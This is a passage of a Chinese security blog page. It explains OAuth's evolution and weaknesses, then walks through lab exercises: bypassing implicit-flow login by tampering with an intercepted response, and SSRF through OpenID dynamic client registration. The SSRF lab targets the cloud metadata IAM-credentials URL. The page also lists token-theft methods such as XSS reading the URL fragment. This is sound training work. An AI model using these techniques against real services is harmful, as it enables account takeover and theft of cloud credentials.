@@ -1,0 +1,990 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>OAuth authentication | ZQ-Rookie-Hacker&#39;s Blog</title>
+  <meta name="author" content="ZQ-Rookie-Hacker">
+  
+  <meta name="description" content="0x00.基础知识OAuth诞生前：古老的&amp;quot;密码共享&amp;quot;时代在OAuth诞生之前，互联网上几乎没有标准化的授权方案。当你想让一个第三方应用（比如一款帮你分析好友社交网络的工具）访问你在另一个平台（比如你的社交账号）上的数据时，唯一的办法就是把你的用户名和密码直接告诉它。但是，这样存在巨大的安全风险：用户与密码可能会被保存、滥用，甚至被恶意程序用来做任何事，而你毫无办法
+后来，一些大型科技公司（比如Google、Facebook）意识到了这个巨大的安全风险，开始各自推出私有的授权方案，例如FlickrAuth和GoogleAuthSub。但这些方案彼此不兼容，开发者需要为每个不同的平台单独学习和适配，极其痛苦
+
+OAuth 1.0：从&amp;quot;共享密码&amp;quot;到&amp;quot;安全授权&amp;quot;为了解决这个”授权困境”，OAuth（开放授权）应运而生。它的故事始于2006年，当时Twitter的一位开发者Blaine Cook在为Twitter实现OpenID时，发现没有一个好的方案来安全地授权第三方应用访问Twitter的API。于是，他与Chris Messina等人一起发起讨论，最终催生了OAuth协议。
+OAuth 1.0协议的核心思想是引入一个&amp;quot;令牌&amp;quot;（Token）的概念。它就像一把精心设计的、有时间限制的”临时钥匙”，第三方应用只需用这把&amp;quot;临时钥匙&amp;quot;来访问你的数据，整个过程完全不需要知道你的密码
+
+OAuth授权过程中，有三个关键角色
+
+
+用户：数据的拥有者，比如社交网站的会员
+服务提供商：保存数据的地方，比如Google、微信
+客户端应用：想要访问用户数据的第三方程序，比如一款分析社交好友的App
+
+
+OAuth 1.0的安全性高度依赖于其复杂的加密签名。为了确保授权过程中的核心数据（如令牌、参数）在传输中不被篡改，开发者必须在客户端（Consumer）和服务提供方（Service Provider）之间对所有HTTP请求进行签名
+
+1.签名的工作原理,其核心思想是服务提供方能够验证收到的请求，确实是由知道正确客户端密钥（Consumer Secret）的客户端发出的，并且在传输过程中未被修改
+
+
+生成签名基础字符串：客户端将HTTP方法、请求URL以及所有OAuth参数（如oauth_consumer_key, oauth_token, oauth_timestamp, oauth_nonce）按字母顺序排序并拼接成一个长字符串
+计算签名：使用客户端密钥（Consumer Secret）和令牌密钥作为密钥，对上述字符串应用哈希算法（如HMAC-SHA1或RSA-SHA1），生成最终的签名值
+发送并验证：签名被放在请求头中发送。服务提供方收到请求后，用同样的方法和密钥计算出预期签名，与收到的签名进行比对，只有完全一致，请求才被认为是合法的
+
+
+
+
+OAuth 1.0 存在的问题"> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="OAuth authentication"/>
+  <meta property="og:site_name" content="ZQ-Rookie-Hacker&#39;s Blog"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+  
+    <link href="/zhuzhuxia.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">ZQ-Rookie-Hacker&#39;s Blog</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class=""></i>Tags
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> OAuth authentication</h1>
+		</div>
+	
+
+
+
+
+<!-- Reading progress bar -->
+<div class="reading-progress-bar" id="reading-progress-bar"></div>
+
+
+<div class="row post">
+		<!-- cols -->
+		
+		<div id="top_meta"></div>
+		<div class="col-md-9">
+		
+
+		<!-- content -->
+		<div class="mypage">
+		  
+		  <!-- 文章统计 -->
+		  <div class="article-stats">
+		    <i class="fa fa-file-text"></i> 字数: <span id="word-count">计算中...</span>
+		    <span style="margin-left: 12px;"><i class="fa fa-clock-o"></i> 阅读时长: <span id="reading-time">计算中...</span></span>
+		  </div>
+		  
+		  
+
+		  <h3 id="0x00-基础知识"><a href="#0x00-基础知识" class="headerlink" title="0x00.基础知识"></a>0x00.基础知识</h3><h4 id="OAuth诞生前：古老的-密码共享-时代"><a href="#OAuth诞生前：古老的-密码共享-时代" class="headerlink" title="OAuth诞生前：古老的&quot;密码共享&quot;时代"></a><strong><code>OAuth诞生前：古老的&quot;密码共享&quot;时代</code></strong></h4><p>在OAuth诞生之前，互联网上几乎没有标准化的授权方案。当你想让一个第三方应用（比如一款帮你分析好友社交网络的工具）访问你在另一个平台（比如你的社交账号）上的数据时，<code>唯一的办法</code>就是把你的用户名和密码直接告诉它。但是，这样存在巨大的安全风险：用户与密码可能会被保存、滥用，甚至被恶意程序用来做任何事，而你毫无办法</p>
+<p>后来，一些大型科技公司（比如Google、Facebook）意识到了这个巨大的安全风险，开始各自推出私有的授权方案，例如FlickrAuth和GoogleAuthSub。但这些方案彼此不兼容，开发者需要为每个不同的平台单独学习和适配，极其痛苦</p>
+<hr>
+<h4 id="OAuth-1-0：从-共享密码-到-安全授权"><a href="#OAuth-1-0：从-共享密码-到-安全授权" class="headerlink" title="OAuth 1.0：从&quot;共享密码&quot;到&quot;安全授权&quot;"></a><strong><code>OAuth 1.0：从&quot;共享密码&quot;到&quot;安全授权&quot;</code></strong></h4><p>为了解决这个”授权困境”，OAuth（开放授权）应运而生。它的故事始于2006年，当时Twitter的一位开发者Blaine Cook在为Twitter实现OpenID时，发现没有一个好的方案来安全地授权第三方应用访问Twitter的API。于是，他与Chris Messina等人一起发起讨论，最终催生了OAuth协议。</p>
+<p>OAuth 1.0协议的核心思想是引入一个<code>&quot;令牌&quot;（Token）</code>的概念。它就像一把精心设计的、有时间限制的”临时钥匙”，第三方应用只需用这把<code>&quot;临时钥匙&quot;</code>来访问你的数据，整个过程完全不需要知道你的密码</p>
+<blockquote>
+<p>OAuth授权过程中，有三个关键角色</p>
+<blockquote>
+<ol>
+<li><code>用户</code>：数据的拥有者，比如社交网站的会员</li>
+<li><code>服务提供商</code>：保存数据的地方，比如Google、微信</li>
+<li><code>客户端应用</code>：想要访问用户数据的第三方程序，比如一款分析社交好友的App</li>
+</ol>
+</blockquote>
+<p>OAuth 1.0的安全性<code>高度依赖</code>于其复杂的加密签名。为了确保授权过程中的核心数据（如令牌、参数）在传输中不被篡改，开发者<code>必须</code>在客户端（Consumer）和服务提供方（Service Provider）之间对<code>所有HTTP</code>请求进行签名</p>
+<blockquote>
+<p>1.签名的工作原理,其核心思想是<code>服务提供方</code>能够验证收到的请求，确实是由知道正确客户端密钥（Consumer Secret）的客户端发出的，并且在传输过程中<code>未被修改</code></p>
+<blockquote>
+<ol>
+<li>生成签名基础字符串：客户端将HTTP方法、请求URL以及所有OAuth参数（如<code>oauth_consumer_key</code>, <code>oauth_token</code>, <code>oauth_timestamp</code>, <code>oauth_nonce</code>）按字母顺序排序并拼接成一个长字符串</li>
+<li>计算签名：使用<code>客户端密钥</code>（Consumer Secret）和<code>令牌密钥</code>作为密钥，对上述字符串应用哈希算法（如HMAC-SHA1或RSA-SHA1），生成最终的签名值</li>
+<li>发送并验证：签名被放在<code>请求头</code>中发送。服务提供方收到请求后，用同样的方法和密钥计算出预期签名，与收到的签名进行<code>比对</code>，只有完全一致，请求才被认为是合法的</li>
+</ol>
+</blockquote>
+</blockquote>
+</blockquote>
+<p><code>OAuth 1.0 </code>存在的问题</p>
+<blockquote>
+<ol>
+<li><p>开发者面临的沉重负担</p>
+<blockquote>
+<ol>
+<li>实现成本极高：开发者需要为每个请求手动处理复杂的参数排序、编码和哈希计算。绝大多数开发者无法从头实现，不得不依赖第三方代码库，但这并没有完全简化问题。</li>
+<li>维护和调试困难：签名计算的任何微小错误（如字符编码不一致、参数顺序错误）都会导致验证失败，排查这类问题极其耗时。</li>
+<li>可读性差：签名机制将简单的授权过程变得异常晦涩，导致协议的实现门槛很高</li>
+</ol>
+</blockquote>
+</li>
+<li><p>致命的会话固定攻击</p>
+<blockquote>
+<ol>
+<li>漏洞根源<blockquote>
+<p>OAuth 1.0协议允许客户端（攻击者）在用户授权之前，就<code>先获取</code>一个“请求令牌”（Request Token）。同时，回调URL（oauth_callback）参数是动态且攻击者<code>可控的</code>。这两个缺陷组合起来，使攻击者可以预先准备一个包含自己“请求令牌”的恶意授权链接</p>
+</blockquote>
+</li>
+<li>攻击流程<blockquote>
+<ol>
+<li>准备陷阱：攻击者发起一个正常的OAuth流程，从服务提供方获取一个未授权的“请求令牌” T，并构造一个授权URL：<a target="_blank" rel="noopener" href="https://service.com/authorize?oauth_token=T%E3%80%82">https://service.com/authorize?oauth_token=T。</a></li>
+<li>发送诱饵：攻击者将这个URL通过邮件、短信等方式发给受害者Carlos，并伪装成正常授权请求，诱导他点击。</li>
+<li>受害者授权：当Carlos点击链接时，由于oauth_token&#x3D;T是有效的，他可能会认为这是正常的登录授权。Carlos在页面上登录并完成授权。此时，攻击者持有的令牌T从“未授权”变成了“已授权”状态。</li>
+</ol>
+</blockquote>
+</li>
+</ol>
+</blockquote>
+</li>
+</ol>
+</blockquote>
+<p>2009年6月发布的<code>OAuth 1.0a</code>正是为了修补会话固定漏洞</p>
+<blockquote>
+<ol>
+<li>核心修复：强制绑定回调URL<blockquote>
+<p>.0a版本强制规定，服务提供方必须将获取请求令牌时收到的oauth_callback参数值，与用户授权完成后实际回调的URL进行比对。如果两者不一致，整个流程必须终止。</p>
+</blockquote>
+</li>
+</ol>
+<p>实际上，更安全的实现是服务提供方直接忽略客户端在授权阶段传入的任何oauth_callback参数，强制使用获取请求令牌时约定的那个回调地址</p>
+<ol start="2">
+<li>新增验证码机制<blockquote>
+<p>.0a还在授权流程的最后一步引入了验证码（oauth_verifier）。当用户授权后，服务提供方会生成一个临时验证码，客户端必须用这个验证码才能换取最终的访问令牌。这确保了即使攻击者截获了授权回调，没有这个验证码也无法完成令牌交换</p>
+</blockquote>
+</li>
+</ol>
+</blockquote>
+<p>需要特别注意的是，<code>OAuth 1.0a的核心价值</code>在于通过规范层面的强制性要求，堵住了回调URL被滥用的路径。但它<code>并没有废除</code>原有复杂的签名机制，因此开发者面临的复杂性依然存在</p>
+<hr>
+<h4 id="OAuth-2-0：从具体协议到更灵活更复杂的授权框架"><a href="#OAuth-2-0：从具体协议到更灵活更复杂的授权框架" class="headerlink" title="OAuth 2.0：从具体协议到更灵活更复杂的授权框架"></a><strong><code>OAuth 2.0：从具体协议到更灵活更复杂的授权框架</code></strong></h4><p>鉴于 OAuth 1.0 的复杂性，OAuth 2.0 于 2012 年作为 RFC 6749 发布。它不再是具体的协议，而是一个 授权框架，旨在为不同场景（Web 应用、移动 App、IoT）提供灵活的授权方式。</p>
+<p><code>最突出的变化</code>：</p>
+<ul>
+<li><p>强制使用 HTTPS 保证通信安全，<code>完全摒弃</code> OAuth 1.0 中复杂的加密签名。</p>
+</li>
+<li><p>定义<code>多种 授权类型（grant types）</code>，由开发者根据安全需求和客户端能力选择。</p>
+</li>
+</ul>
+<p>四种主要授权类型（Grant Types）</p>
+<table>
+<thead>
+<tr>
+<th>授权类型</th>
+<th>安全性</th>
+<th>核心特征</th>
+<th>适用场景</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>授权码模式</strong></td>
+<td>高</td>
+<td>返回一次性 <code>code</code>，后端用 <code>client_secret</code> 换 <code>access_token</code></td>
+<td>有后端服务器的传统 Web 应用</td>
+</tr>
+<tr>
+<td><strong>隐式模式</strong></td>
+<td>低</td>
+<td>直接在 URL 片段中返回 <code>access_token</code>，无授权码</td>
+<td>纯前端应用（SPA）—— <strong>现已弃用</strong></td>
+</tr>
+<tr>
+<td><strong>密码模式</strong></td>
+<td>极低</td>
+<td>客户端直接收集用户名&#x2F;密码换令牌</td>
+<td>高度信任的官方应用 —— <strong>已弃用</strong></td>
+</tr>
+<tr>
+<td><strong>客户端凭证模式</strong></td>
+<td>中等</td>
+<td>代表应用自身，不关联任何用户</td>
+<td>服务器之间的后端通信</td>
+</tr>
+</tbody></table>
+<p><code>授权码模式（Authorization Code Grant）</code><br><img src="/images/OAuth_authentication/image_1.png" alt="在这里插入图片描述"></p>
+<p><code>隐式模式（Implicit Grant）</code><br><img src="/images/OAuth_authentication/image_2.png" alt="在这里插入图片描述"></p>
+<p><code>漏洞根源</code></p>
+<blockquote>
+<ol>
+<li>令牌直接出现在 URL 片段中</li>
+<li>无客户端认证（缺少 client_secret）</li>
+<li>缺少令牌与用户的绑定验证（客户端实现错误）</li>
+<li>没有刷新令牌（Refresh Token）</li>
+<li>重定向 URI 验证宽松（常见配置错误）</li>
+</ol>
+</blockquote>
+<p><code>漏洞利用</code></p>
+<blockquote>
+<ol>
+<li>窃取令牌<br>由于 access_token 直接出现在回调 URL 的 # 片段中（例如 <a target="_blank" rel="noopener" href="https://app.com/callback#access_token=xyz%EF%BC%89%EF%BC%8C%E6%94%BB%E5%87%BB%E8%80%85%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87%E4%BB%A5%E4%B8%8B%E6%96%B9%E5%BC%8F%E8%8E%B7%E5%8F%96%EF%BC%9A">https://app.com/callback#access_token=xyz），攻击者可以通过以下方式获取：</a><blockquote>
+<p>读取浏览器历史记录<br>通过 HTTP Referer 头泄露（如果页面有跳转）<br>利用 XSS 漏洞：document.location.hash<br>恶意浏览器插件<br>2. 令牌替换 &#x2F; 重放<br>攻击者拿到令牌后，直接用它冒充受害者调用资源服务器的 API。<br>如果客户端应用只验证令牌是否有效，但不检查令牌与当前用户的绑定关系（常见错误），攻击者用自己的令牌就能访问受害者的数据。<br>3. 篡改回调参数<br>有些客户端会从回调 URL 中直接读取 email 等参数，而不验证这些参数是否与令牌真正关联。<br>攻击者可以手动修改回调 URL 中的 email 为 <a href="mailto:&#118;&#x69;&#99;&#116;&#105;&#109;&#x40;&#x65;&#x78;&#97;&#109;&#x70;&#108;&#101;&#x2e;&#x63;&#111;&#109;">victim@example.com</a>，然后让客户端用这个伪造的身份建立会话。</p>
+</blockquote>
+</li>
+</ol>
+</blockquote>
+<p><code>客户端凭证模式（Client Credentials Grant）</code><br><img src="/images/OAuth_authentication/image_3.png" alt="在这里插入图片描述"></p>
+<hr>
+<h4 id="OAuth-2-1：从“可选安全”到“默认安全”的整合升级"><a href="#OAuth-2-1：从“可选安全”到“默认安全”的整合升级" class="headerlink" title="OAuth 2.1：从“可选安全”到“默认安全”的整合升级"></a><strong><code>OAuth 2.1：从“可选安全”到“默认安全”的整合升级</code></strong></h4><p><strong><code>抛弃</code></strong></p>
+<ul>
+<li><p>隐式模式（Implicit Grant） —— 不再允许直接在 URL 片段中返回 access_token。</p>
+</li>
+<li><p>密码模式（Resource Owner Password Credentials） —— 不再允许客户端收集用户密码换令牌。</p>
+</li>
+</ul>
+<p><strong><code>增加（强制要求）</code></strong></p>
+<ul>
+<li><p>强制 PKCE（Proof Key for Code Exchange） —— 所有客户端（包括有后端的 Web 应用）都必须在授权码模式中使用 PKCE。</p>
+</li>
+<li><p>重定向 URI 精确匹配 —— 不再允许通配符或部分匹配，必须完整字符串匹配。</p>
+</li>
+<li><p>禁止在 URL 中传递 Bearer Token —— 令牌只能通过 Authorization: Bearer 头发送。</p>
+</li>
+</ul>
+<p><img src="/images/OAuth_authentication/image_4.png" alt="在这里插入图片描述"></p>
+<hr>
+<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a><strong><code>总结</code></strong></h4><table>
+<thead>
+<tr>
+<th>阶段</th>
+<th>核心特点</th>
+<th>主要问题</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>密码共享时代</strong></td>
+<td>第三方应用直接获取用户密码</td>
+<td>密码泄露、权限无限制、无法撤销</td>
+</tr>
+<tr>
+<td><strong>OAuth 1.0</strong></td>
+<td>引入令牌，无需密码；但需要复杂签名</td>
+<td>签名实现极其复杂；存在会话固定攻击</td>
+</tr>
+<tr>
+<td><strong>OAuth 1.0a</strong></td>
+<td>修复会话固定攻击（回调绑定 + verifier）</td>
+<td>签名复杂问题未解决</td>
+</tr>
+<tr>
+<td><strong>OAuth 2.0</strong></td>
+<td>依赖 HTTPS，抛弃签名；提供多种授权类型</td>
+<td>隐式模式、密码模式不安全；重定向 URI 匹配过松</td>
+</tr>
+<tr>
+<td><strong>OAuth 2.1</strong></td>
+<td>强制 PKCE；移除隐式&#x2F;密码模式；精确匹配 URI；禁止 URL 传 token</td>
+<td>（无新增问题，是对 2.0 的安全强化）</td>
+</tr>
+</tbody></table>
+<p>补充微信小程序标准的登录流程（<code>OAuth 2.0</code>）<br><img src="/images/OAuth_authentication/image_5.png" alt="在这里插入图片描述"></p>
+<hr>
+<h3 id="0x01-通过-OAuth-隐式流程绕过身份验证"><a href="#0x01-通过-OAuth-隐式流程绕过身份验证" class="headerlink" title="0x01.通过 OAuth 隐式流程绕过身份验证"></a>0x01.通过 OAuth 隐式流程绕过身份验证</h3><p>该实验使用 OAuth 服务，允许用户通过社交媒体账户登录。客户端应用程序的验证存在缺陷，使得攻击者无需知道其他用户的密码即可登录其账户。<br>要解决该实验，请登录 Carlos 的账户。他的邮箱地址是 <a href="mailto:&#x63;&#x61;&#x72;&#108;&#x6f;&#x73;&#64;&#x63;&#97;&#114;&#108;&#x6f;&#115;&#45;&#109;&#x6f;&#110;&#116;&#x6f;&#x79;&#97;&#46;&#x6e;&#x65;&#x74;">carlos@carlos-montoya.net</a>。<br>您可以使用以下凭证登录自己的社交媒体账户：wiener:peter</p>
+<p>主页面点击 <code>my account</code><br><img src="/images/OAuth_authentication/image_6.png" alt="在这里插入图片描述"></p>
+<p>点击之后，没有放行，然后抓取了响应包，不知道为什么这样？ 是要重定向到 <code> /social-login</code><br><img src="/images/OAuth_authentication/image_7.png" alt="在这里插入图片描述"></p>
+<p>继续放行，得到以下信息<br><img src="/images/OAuth_authentication/image_8.png" alt="在这里插入图片描述"></p>
+<p>放行之后再次重定向<br><img src="/images/OAuth_authentication/image_9.png" alt="在这里插入图片描述"></p>
+<p>放行之后，来到第三方登录界面<br><img src="/images/OAuth_authentication/image_10.png" alt="在这里插入图片描述"></p>
+<p>输入正确用户密码，再次重定向<br><img src="/images/OAuth_authentication/image_11.png" alt="在这里插入图片描述"></p>
+<p>放行后的结果<br><img src="/images/OAuth_authentication/image_12.png" alt="在这里插入图片描述"></p>
+<p>到第三方确认授权登录界面<br><img src="/images/OAuth_authentication/image_13.png" alt="在这里插入图片描述"></p>
+<p>再点击一下<code>continue</code>，即授权登录</p>
+<p><img src="/images/OAuth_authentication/image_14.png" alt="在这里插入图片描述"></p>
+<p>放行之后的结果<br><img src="/images/OAuth_authentication/image_15.png" alt="在这里插入图片描述"></p>
+<p>再次放行，返回一个回调函数<br><img src="/images/OAuth_authentication/image_16.png" alt="在这里插入图片描述"></p>
+<p>放行，执行回调函数<br><img src="/images/OAuth_authentication/image_17.png" alt="在这里插入图片描述"></p>
+<p>放行<br><img src="/images/OAuth_authentication/image_18.png" alt="在这里插入图片描述"></p>
+<p>结果<br><img src="/images/OAuth_authentication/image_19.png" alt="在这里插入图片描述"></p>
+<p>点击<code>my account</code><br><img src="/images/OAuth_authentication/image_20.png" alt="在这里插入图片描述"></p>
+<p>我们要登录<code>carlos</code>，在整个过程中，在js代码执行返回用户信息处可以下手<br><img src="/images/OAuth_authentication/image_21.png" alt="在这里插入图片描述"></p>
+<p>即，在第15步的时候，<code>Blog</code>没有将 拿到的 <code>email 与 token</code> 发送到 <code>OAuth</code> 中确认是否与之对应</p>
+<p>修改用户名与邮箱，注意在返回包的时候就要改了，不知道为什么抓取不了请求包<br><img src="/images/OAuth_authentication/image_22.png" alt="在这里插入图片描述"><br>放行后<br><img src="/images/OAuth_authentication/image_23.png" alt="在这里插入图片描述"></p>
+<p>结果<br><img src="/images/OAuth_authentication/image_24.png" alt="在这里插入图片描述"></p>
+<p>后来检查了不能抓取请求包的原因，是proxy规则设置错了，即是可以抓取请求包的。</p>
+<hr>
+<h3 id="0x02-通过-OpenID-动态客户端注册实现-SSRF"><a href="#0x02-通过-OpenID-动态客户端注册实现-SSRF" class="headerlink" title="0x02.通过 OpenID 动态客户端注册实现 SSRF"></a>0x02.通过 OpenID 动态客户端注册实现 SSRF</h3><p>本实验允许客户端应用程序通过专用注册端点向 OAuth 服务动态注册自身。OAuth 服务以不安全的方式使用了某些特定于客户端的数据，从而暴露了潜在的 SSRF 攻击向量。<br>要解决实验，请构造一个 SSRF 攻击，访问 <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/</code>，并窃取 OAuth 提供商云环境的秘密访问密钥。<br>你可以使用以下凭据登录自己的账户：wiener:peter</p>
+<h4 id="OpenID-动态客户端注册协议"><a href="#OpenID-动态客户端注册协议" class="headerlink" title="OpenID 动态客户端注册协议"></a>OpenID 动态客户端注册协议</h4><p>引入： <code>OAuth 2.0</code> 和 <code>OpenID Connect</code> 的基本场景<br>想象你要用“微信登录”某个网站（比如一个论坛）。流程通常是：</p>
+<blockquote>
+<ol>
+<li>你点击“微信登录”。</li>
+<li>论坛网站把你重定向到微信的授权页面。</li>
+<li>你输入微信账号密码，授权论坛访问你的基本信息（头像、昵称等）。</li>
+<li>微信给你一个“令牌”（token），你拿着令牌回到论坛。</li>
+<li>论坛拿着令牌去微信那里询问：“这个令牌对应的用户是谁？”微信返回你的身份信息。</li>
+</ol>
+</blockquote>
+<p>这里，论坛网站被称为 <code>客户端（Client）</code>，微信被称为 <code>授权服务器（Authorization Server</code>） 或 <code>OpenID 提供者（OP，OpenID Provider）</code>。</p>
+<p><strong><code>什么是OpenID Connect？</code></strong><br>OpenID Connect 是在 OAuth 2.0 之上增加的一个身份认证层。它让客户端不仅能拿到令牌，还能拿到一个“ID 令牌”，里面包含用户的唯一标识（比如 sub 字段，代表用户的 OpenID）。简单说，<code>OAuth 2.0 管授权，OpenID Connect 管登录</code></p>
+<p><strong><code> 什么是“客户端注册”？</code></strong><br>在 OAuth&#x2F;OpenID 的世界里，任何想要接入的网站（客户端）都必须先在授权服务器那里登记一下，就像你要进小区要先在门卫那里登记姓名、住址。登记后会获得一个 client_id（客户端编号），后续所有交互都要带上这个编号</p>
+<p><code>传统注册</code>：管理员在授权服务器的后台手动填写信息，比如<code>应用名称</code>、<code>应用图标</code>、<code>URL允许的回调地址</code>（redirect_uris，即用户授权后跳转回网站的地址）等等，比较麻烦</p>
+<p><code>动态客户端注册</code>：允许客户端通过发一个 HTTP 请求来自动完成登记。这样<code>任何软件</code>都可以临时注册，不需要人工审核。这是 RFC 7591 定义的。也就是说这个注册过程可以由任何人（包括你这样的攻击者）发起。你不需要证明你是某个合法的公司或开发者，只要向注册端点发送一个符合格式的 HTTP 请求，就能获得一个 client_id。<code>补充</code>：在生产环境中，一个客户端想认证服务器注册OpenID都需要一定的身份验证，验证该客户端的合法性</p>
+<p><strong><code>动态注册时填什么信息？</code></strong><br>注册请求是一个 POST 请求，内容是 JSON，其中<code>必须包含</code> redirect_uris（允许的回调地址），还可以包含很多可选信息<br>如：<code>client_name</code>（客户端名称）、<code>logo_uri</code>（客户端的图标地址，即图片 URL）、<code>tos_uri</code>（服务条款地址） 等等</p>
+<p><img src="/images/OAuth_authentication/image_25.png" alt="在这里插入图片描述"><br>OpenID Connect 是 OAuth 2.0 的扩展，它没有改变 OAuth 的基本流程，只是在换取令牌的响应中<code>增加</code>了一个 id_token 字段。其中id_token<code>就是使用JWT</code>。单纯的 <code>OAuth 2.0</code> 是可以完全不用 JWT</p>
+<p><strong><code>OIDC（OpenID Connect）的主要主键</code></strong></p>
+<blockquote>
+<ol>
+<li>ID Token：是一个 JSON Web Token（JWT），包含关于身份提供者（Identity Provider, IdP）验证的用户身份的信息。包含用户标识（如 sub），认证时间（auth_time），认证方法（acr）等。</li>
+<li>UserInfo Endpoint：一个保护的资源端点，用于返回有关用户的附加信息，如姓名、电子邮件地址等。客户端使用访问令牌（Access Token）来请求用户信息。</li>
+<li>Authorization Endpoint：用于获取授权码（Authorization Code）的端点。客户端引导用户到该端点进行身份验证和授权。</li>
+<li>Token Endpoint：用于交换授权码或刷新令牌以获取访问令牌和 ID 令牌的端点。</li>
+</ol>
+<ul>
+<li><code>/.well-known/openid-configuration </code>这个「路径后缀」是 OIDC 规范强制要求、绝对不能修改的；但前面的「Issuer 前缀」可以由厂商自定义（只要符合 URL 规范）。要强调一下这个注册点是OAuth服务器提供的，不是客户端</li>
+</ul>
+</blockquote>
+<p><strong><code>所以漏洞的环节在哪里？</code></strong><br>由上面可知，攻击攻击者可以注册时可以提交 <code>logo_uri</code>，OAuth服务器处理的方式包括：</p>
+<ol>
+<li><p><code>前置须知</code></p>
+<ul>
+<li>在动态客户端注册阶段（POST &#x2F;reg），客户端都会在请求体中提供 logo_uri 字段（例如 “logo_uri”: “<a target="_blank" rel="noopener" href="https://myapp.com/logo.png%22%EF%BC%89%E3%80%82">https://myapp.com/logo.png&quot;）。</a></li>
+<li>OAuth 服务器收到后，都会把这个 URL 保存下来，作为该客户端的元数据</li>
+</ul>
+</li>
+<li><p><code>标准实现 (返回字段)</code>：许多实现遵循 RFC 7592，通过 registration_client_uri 管理接口返回 JSON 格式的完整客户端配置。客户端读取该 JSON 中的 logo_uri 字段，再自行解析展示</p>
+<blockquote>
+<ol>
+<li>浏览器需要展示某个客户端的 Logo 时，它首先向 OAuth 服务器请求该客户端的元数据。</li>
+<li>请求：GET &#x2F;registration_client_uri&#x2F;{client_id}（例如 &#x2F;reg&#x2F;abc123）</li>
+<li>OAuth 服务器返回一个 JSON，里面包含该客户端的所有注册信息，其中包括 logo_uri 字段。</li>
+<li>响应体：{“client_id”:”abc123”, “logo_uri”:”<a target="_blank" rel="noopener" href="https://myapp.com/logo.png">https://myapp.com/logo.png</a>“, …}</li>
+<li>浏览器解析这个 JSON，拿到 logo_uri 的值（<a target="_blank" rel="noopener" href="https://myapp.com/logo.png%EF%BC%89%EF%BC%8C%E7%84%B6%E5%90%8E%E6%B5%8F%E8%A7%88%E5%99%A8%E8%87%AA%E5%B7%B1%E5%90%91">https://myapp.com/logo.png），然后浏览器自己向</a> myapp.com 发起请求，获取真正的图片并显示。</li>
+</ol>
+</blockquote>
+</li>
+<li><p><code>非标准实现 (专用接口)</code>：为了方便浏览器直接展示，一些实现会提供一个专门的 HTTP 接口（如 &#x2F;client&#x2F;{client_id}&#x2F;logo）来直接返回 Logo 图片。这个接口在后台可能会去请求 logo_uri 存储的地址</p>
+<blockquote>
+<ol>
+<li>浏览器直接请求一个 OAuth 服务器提供的专用图片接口：GET &#x2F;client&#x2F;{client_id}&#x2F;logo</li>
+<li>OAuth 服务器收到这个请求后，内部主动去请求它之前保存的 logo_uri 地址（例如 <a target="_blank" rel="noopener" href="https://myapp.com/logo.png%EF%BC%89%E3%80%82">https://myapp.com/logo.png）。</a></li>
+<li>OAuth 服务器拿到响应内容（通常是图片）后，直接将其作为自己的响应体返回给浏览器。</li>
+</ol>
+</blockquote>
+</li>
+</ol>
+<p><strong><code>云元数据服务是什么？</code></strong><br>云元数据服务是一个运行在云服务器内部（例如AWS EC2、阿里云ECS、腾讯云CVM、Azure VM等）的特殊服务。它本质上是一个小型的HTTP Web服务器，可以通过特定的IP地址访问。</p>
+<blockquote>
+<ol>
+<li><p>核心IP地址</p>
+<blockquote>
+<p>绝大多数云服务商统一使用 169.254.169.254 这个特殊的IP地址作为元数据服务的访问入口。这个地址是一个“链路本地地址”，意味着它只能在物理网络内部（即服务器本身）路由，外部互联网无法直接访问</p>
+</blockquote>
+</li>
+<li><p>主要数据内容</p>
+<blockquote>
